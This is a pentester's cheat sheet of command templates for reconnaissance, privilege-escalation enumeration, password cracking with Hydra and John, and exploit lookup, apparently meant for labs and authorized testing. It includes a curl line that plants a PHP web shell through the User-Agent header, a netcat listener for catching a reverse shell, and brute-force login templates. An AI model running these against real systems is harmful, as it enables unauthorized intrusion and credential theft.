# Pentester's Cheat Sheet
Quick reference guide to all things pentest.



## Recon
### Nmap
Let's look for those open ports and export the output to a specified directory using `nmap`.
```
nmap -sV -sC -vv -oN ./scan [ip_address]
```

### Dirb
DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analyzing the responses. DIRB’s main purpose is to help in professional web application auditing. 
```
dirb http://[ip or domain name]/[optional directories] [path_to_wordlist]
```

### SMBMap
SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands. This tool was designed with pen testing in mind, and is intended to simplify searching for potentially sensitive data across large networks.
```
smbmap -H [ip_address]
```
If an error is returned, try the `-u` switch and declare a username.
```
smbmap -H [ip_address] -u test
```



## Enumeration
### LinPEAS
LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts.
```
# 1. Copy over the LinPEAS script over OpenSSH using ~scp~ 
scp [LinPEAS_file_path] [user]@[ip_address]:[file_path] <-- Psst! /dev/shm is a great place

# 2. Change directory to ensure file transfer was successful and set file as executable 
chmod +x [file_name].sh

# 3. Now its time to let LinPEAS work its magic and find some escalation vectors. Run the following:
./linpeas.sh | tee linlog.txt

For more information, check out LinPEAS Github: https://github.com/carlospolop/PEASS-ng/
```



## Cracking
### Hydra
Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add.

> Hydra ssh
```
hydra -l [username] -P [wordlist] [ip_address] ssh
```

> Hydra http-post-form
```
hydra -l [username] -P [path_to_wordlist] [target_ip] http-post-form "/[directory]:[user_param]=^USER^&[password_param]=^PASS^:[error_message]"
```

### John
John the Ripper is a tool designed to help systems administrators to find weak (easy to guess or crack through brute force) passwords, and even automatically mail users warning them about it, if it is desired.

Run private SSH key against ssh2john to produce a new hash file. Next, crack the hash using specified wordlist. This should provid 
a password for password protected private keys. 

> ssh2john

For password protected private keys, convert the RSA key into a readable hash file for John to crack. 
```
ssh2john [key_id_rsa] > [new_file_name]
```
> John
```
john [path_to_file] --wordlist=[path to wordlist]
```


## Exploits
Exploit Database Archive Search After locating the exploit, copy it into the current directory.
```
searchsploit -m [exploit_file_path]
```



## Basic Linux Commands

- List directory, show hidden, and permissions files
```
ls -la
```

- Change Permissions for a file or directory:
```
chmod ### [file] or [directory]
```

- Another way of changing permissions over a directory is:
```
chown [user_name] [dir]
```

- Find files with SUID bit set:
```
find / -perm /4000
```
> Or (if using is in sudoers file).
```
sudo -l
```
- Open and listen on a port using `nc`. Now you're ready to execute that reverse shell.
```
nc -lvp [port_number]
```


## Random Tips & Tricks
### RSA Keys
RSA Keys only like to be read by authenticated Users. Groups and others.. not so much. Be sure to change permissions to:
```
chmod 600 [RSA_Key_file_name]
```

### User Agents
Somestimes PHP can be passed in through request headers, specifically the User-Agent. If successful we can pass in an ecoded web shell one-liner via the `c` parameter. 
```
curl [ip or domain name] -H "User-Agent:<?php system(\$_GET['c']); ?>"
```

### Interactive Shell
Maybe you need to switch users, maybe you prefer BASH - either way you need to spawn an interactive shell. Also, `echo $0` will inform you of which shell you're currently using. 
```
python -c "import pty;pty.spawn('/bin/bash')"
```
